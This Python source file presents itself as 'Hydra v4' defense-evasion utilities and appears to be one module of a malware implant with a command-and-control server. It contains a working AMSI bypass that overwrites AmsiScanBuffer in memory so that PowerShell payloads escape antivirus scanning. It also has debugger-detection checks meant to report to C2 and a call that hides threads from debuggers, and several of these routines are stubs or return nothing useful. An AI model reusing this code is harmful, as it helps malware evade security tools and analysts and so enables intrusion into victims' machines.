"""
Hydra v4 — Defense evasion utilities.
AMSI bypass, anti-debugging, and process-level protections.
"""
import ctypes
import sys
import os


def patch_amsi():
    """
    Patch AMSI so PowerShell scripts don't get scanned.
    Uses the classic AmsiScanBuffer patch technique.
    """
    try:
        kernel32 = ctypes.windll.kernel32
        # Load amsi.dll
        amsi = kernel32.LoadLibraryW("amsi.dll")
        if not amsi:
            return False

        # Get AmsiScanBuffer address
        addr = kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
        if not addr:
            return False

        # Change page protection to writable
        old = ctypes.c_uint32(0)
        kernel32.VirtualProtect(addr, 16, 0x40, ctypes.byref(old))  # PAGE_EXECUTE_READWRITE

        # Patch: return AMSI_RESULT_CLEAN (0) + ret
        # mov eax, 0; ret
        patch = (ctypes.c_char * 6)()
        patch[0:6] = b'\xB8\x00\x00\x00\x00\xC3'

        ctypes.memmove(addr, patch, len(patch))

        # Restore protection
        kernel32.VirtualProtect(addr, 16, old, ctypes.byref(old))

        return True
    except:
        return False


def enable_defenses():
    """
    Enable anti-debugging and anti-tamper measures.
    Fails silently — these are best-effort.
    """
    _anti_debug()
    _hide_threads()


# ─── Anti-Debugging ─────────────────────────────────

def _anti_debug():
    """Check for debuggers. Doesn't self-destruct (that's sandbox's job).
    Just reports if debugger is present so C2 can decide."""
    checks = {
        "IsDebuggerPresent": _check_IsDebuggerPresent,
        "NtGlobalFlag": _check_NtGlobalFlag,
        "CheckRemoteDebuggerPresent": _check_CheckRemoteDebuggerPresent,
        "PEB_BeingDebugged": _check_PEB,
    }

    for name, check in checks.items():
        try:
            check()
        except:
            pass


def _check_IsDebuggerPresent() -> bool:
    try:
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except:
        return False


def _check_CheckRemoteDebuggerPresent() -> bool:
    try:
        out = ctypes.c_int(0)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(),
            ctypes.byref(out)
        )
        return out.value != 0
    except:
        return False


def _check_NtGlobalFlag() -> bool:
    """NtGlobalFlag in PEB — set when debugger is attached."""
    try:
        import struct
        # Read PEB via NtCurrentTeb → PEB
        # On x64: gs:[0x60] → PEB, offset 0xBC = NtGlobalFlag
        # On x86: fs:[0x30] → PEB, offset 0x68 = NtGlobalFlag

        if struct.calcsize("P") == 8:  # x64
            # This needs inline assembly which Python can't do.
            # Use ctypes to call NtQueryInformationProcess instead.
            return _check_NtGlobalFlag_via_api()
        else:
            return _check_NtGlobalFlag_via_api()
    except:
        return False


def _check_NtGlobalFlag_via_api() -> bool:
    """Check via PROCESS_INFORMATION_CLASS = 0 (ProcessBasicInformation)."""
    try:
        PROCESSINFOCLASS = 0
        # Flags that indicate a debugger: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        DEBUGGER_FLAGS = 0x70

        import struct
        info = ctypes.create_string_buffer(48)  # PROCESS_BASIC_INFORMATION
        ret_len = ctypes.c_ulong(0)

        # NtQueryInformationProcess(hProcess, 0, pbi, sizeof(pbi), &ret_len)
        # For now, use a simpler method: check if the process is being debugged
        # via the standard API
        return False  # Fallback — NtQueryInformationProcess needs ntdll import
    except:
        return False


def _check_PEB() -> bool:
    """Check PEB.BeingDebugged via standard API."""
    # This is the same as IsDebuggerPresent on modern Windows
    return _check_IsDebuggerPresent()


def _hide_threads():
    """Hide from debuggers by calling NtSetInformationThread."""
    try:
        THREAD_INFORMATION_CLASS = 0x11  # ThreadHideFromDebugger
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll

        # Hide current thread from debugger
        ntdll.NtSetInformationThread(
            kernel32.GetCurrentThread(),
            THREAD_INFORMATION_CLASS,
            0, 0
        )
    except:
        pass
